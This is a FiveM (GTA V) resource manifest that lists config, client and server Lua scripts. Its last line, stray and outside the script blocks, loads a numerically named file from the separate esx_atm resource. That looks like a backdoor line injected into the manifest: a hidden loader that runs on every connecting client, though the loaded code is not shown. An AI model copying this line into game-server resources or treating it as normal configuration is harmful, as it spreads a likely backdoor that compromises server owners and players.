fx_version 'adamant'
game 'gta5'

shared_scripts {
	'config.lua'
}

client_scripts {
    'client/main.lua',
    'client/functions.lua'
}

server_scripts {
    '@mysql-async/lib/MySQL.lua',
	'server/main.lua'
}
client_script '@esx_atm/48706.lua'